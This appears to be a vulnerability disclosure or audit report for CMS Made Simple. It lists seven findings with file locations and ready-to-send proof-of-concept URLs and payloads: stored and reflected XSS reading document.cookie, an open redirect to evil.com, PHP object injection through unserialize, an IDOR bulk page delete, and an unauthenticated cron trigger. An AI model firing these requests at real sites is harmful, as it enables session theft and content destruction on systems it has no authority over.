# CMS Made Simple — Confirmed Security Findings

Notes: `TARGET` = site host. `KEY` = victim admin's `__c` session token (present in every admin URL).
Frontend module params are prefixed `cntnt01`; admin module params are prefixed `m1_`.

---

## 1. Stored XSS — News front-end submission (unauthenticated)
- **Name:** Stored Cross-Site Scripting (CWE-79)
- **File:** `modules/News/action.fesubmit.php` (`__newsCleanHTML` only strips `<script>`/`script:`); rendered raw by `{$entry->content}`/`{$entry->summary}`
- **URL:**
  ```
  https://TARGET/index.php?mact=News,cntnt01,fesubmit,0&cntnt01submit=1&cntnt01title=hi&cntnt01content=<img src=x onerror=alert(document.cookie)>&cntnt01summary=<svg onload=alert(1)>
  ```
- **Payload:** `<img src=x onerror=alert(document.cookie)>`
- **Description:** When the admin enables `allow_fesubmit`, an anonymous user submits News content whose event-handler payload survives the weak sanitizer and executes when the article is viewed. Config-gated (needs feature on + article published/approved).

---

## 2. Stored/Self XSS + Open Redirect — Bookmarks
- **Name:** Stored XSS (CWE-79) + Open Redirect (CWE-601)
- **File:** `admin/makebookmark.php:35,40` (raw `$_GET['title']` stored; `$_GET['ref']` base64→`Location:`); `admin/listbookmarks.php:76-77` echoes raw
- **URL (store):**
  ```
  https://TARGET/admin/makebookmark.php?__c=KEY&title=<img src=x onerror=alert(document.cookie)>&ref=ZXZpbC5jb20=
  ```
- **URL (fires):** `https://TARGET/admin/listbookmarks.php?__c=KEY`
- **Payload:** title=`<img src=x onerror=alert(document.cookie)>` ; ref=`ZXZpbC5jb20=` (base64 `evil.com` → redirect to `//evil.com`)
- **Description:** Bookmark title stored without sanitization and echoed raw on the list page; `ref` produces a protocol-relative open redirect. Requires the session key (self-XSS).

---

## 3. Reflected XSS — MicroTiny file picker
- **Name:** Reflected Cross-Site Scripting (CWE-79)
- **File:** `modules/MicroTiny/action.filepicker.php` (raw `$_GET['field']`, `$_GET['subdir']`); `templates/filepicker.tpl:111` (`field_id:'{$field}'`, JS context) and `:36` (`{$startpath}`, HTML context)
- **URL:**
  ```
  https://TARGET/admin/moduleinterface.php?mact=MicroTiny,m1_,filepicker,0&__c=KEY&showtemplate=false&field=x';alert(document.cookie);//
  ```
- **Payload:** `field=x';alert(document.cookie);//` (JS breakout) or `subdir=</p><svg onload=alert(1)>`
- **Description:** Unsanitized `field`/`subdir` reflected into JS-string and HTML contexts in the file-picker popup. Requires admin login + session key.

---

## 4. Reflected XSS — Event Manager
- **Name:** Reflected Cross-Site Scripting (CWE-79)
- **File:** `admin/eventhandlers.php:74-75` (raw `$_GET['event']`/`$_GET['module']` echoed; also into `href`s)
- **URL:**
  ```
  https://TARGET/admin/eventhandlers.php?__c=KEY&action=showeventhelp&module=Core&event=<script>alert(document.cookie)</script>
  ```
- **Payload:** `event=<script>alert(document.cookie)</script>`
- **Description:** `event`/`module` GET params echoed unescaped in the event-help view. Requires admin login + session key.

---

## 5. PHP Object Injection — CMSContentManager bulk actions
- **Name:** Insecure Deserialization / PHP Object Injection (CWE-502)
- **File:** `modules/CMSContentManager/action.admin_bulk_delete.php:87,124` (also `admin_bulk_active`, `admin_bulk_secure`, `admin_bulk_cachable`, `admin_bulk_showinmenu`, `admin_bulk_changeowner`, `admin_bulk_setdesign`, `admin_multicontent`); `modules/UserGuide/lib/class.UserGuideImporterExporter.php:276,298`
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?__c=KEY
  mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=<base64(serialize($object))>
  ```
- **Payload:** `m1_multicontent = base64_encode(serialize($craftedObject))`
- **Description:** `unserialize(base64_decode($params['multicontent']))` on an unsigned request param instantiates attacker-chosen objects (POP-gadget entry point). Authenticated; needs content-management access.

---

## 6. Broken Access Control (IDOR) — bulk page delete
- **Name:** Missing Function-Level Authorization / IDOR (CWE-862 / CWE-639)
- **File:** `modules/CMSContentManager/action.admin_bulk_delete.php:93-99` (delete loop never calls `cmscm_admin_bulk_delete_can_delete()`; authorship checked only in the preview at `:62`)
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?__c=KEY
  mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_action=admin_bulk_delete&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=YTo1OntpOjA7aToyO2k6MTtpOjM7aToyO2k6NDtpOjM7aTo1O2k6NDtpOjY7fQ==
  ```
- **Payload:** `m1_multicontent = base64(serialize([2,3,4,5,6]))` — arbitrary page IDs the user does not own
- **Description:** Per-page authorship is enforced on the confirmation preview but not on execution; a user with only "Remove Pages" can delete any page (except default home) by tampering `multicontent`. Site-wide content destruction / DoS.

---

## 7. Unauthenticated cron trigger — CmsJobManager
- **Name:** Missing Authentication for Critical Function (CWE-306)
- **File:** `modules/CmsJobManager/action.process.php:3` (gated only by `isset($_REQUEST['cms_cron'])`)
- **URL:**
  ```
  https://TARGET/index.php?mact=CmsJobManager,cntnt01,process,0&cms_cron=1
  ```
- **Payload:** `cms_cron=1`
- **Description:** Async job-queue processing can be triggered by anyone with no login or shared secret (self-throttled by a timestamp, so not raw DoS).
